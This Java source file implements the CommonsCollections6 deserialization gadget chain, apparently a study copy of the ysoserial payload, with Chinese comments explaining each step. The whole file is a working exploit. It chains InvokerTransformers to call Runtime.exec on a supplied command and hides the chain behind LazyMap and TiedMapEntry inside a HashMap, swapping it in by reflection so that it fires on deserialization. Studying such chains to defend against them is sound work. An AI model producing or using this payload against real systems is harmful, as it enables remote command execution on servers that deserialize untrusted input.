package com.hachp1.deser.ysoserial;


import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;


public class CC6 {

    public static Object getObject(String cmd) throws Exception {
        // 真正的执行链
        Transformer[] trueTransformer = {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{Runtime.class, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{cmd})
        };


        // 底层还是LazyMap触发Transformer链，先不放真正的Transformer，防止反序列化之前被触发
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(1)
        });

        // 准备LazyMap，想办法触发LazyMap#get()
        HashMap<Object, Object> hashMap = new HashMap<>();
        Map evalMap = LazyMap.decorate(hashMap, chainedTransformer);

        TiedMapEntry tiedMapEntry = new TiedMapEntry(evalMap, "test");

        // 将TiedMapEntry作为key放入HashMap，HashMap#readObject会调用hash(key)，和URLDNS类似
        HashMap<Object, Object> res = new HashMap<>();
        res.put(tiedMapEntry, "something");

        // HashMap#put()也会调用hash(key)，所以最终经过LazyMap中的Transformer处理后，LazyMap会多一个键值对{"test":1}
        // 所以为了lazyMap#get()顺利执行factory.transform(key)，我们需要在反序列化前将键值对{"test":1}去掉
        evalMap.remove("test");

        // 最后在chainedTransformer中填入真正的执行链
        Class<? extends ChainedTransformer> clazz = chainedTransformer.getClass();
        Field iTransformers = clazz.getDeclaredField("iTransformers");
        iTransformers.setAccessible(true);
        iTransformers.set(chainedTransformer, trueTransformer);

        return res;
    }

}
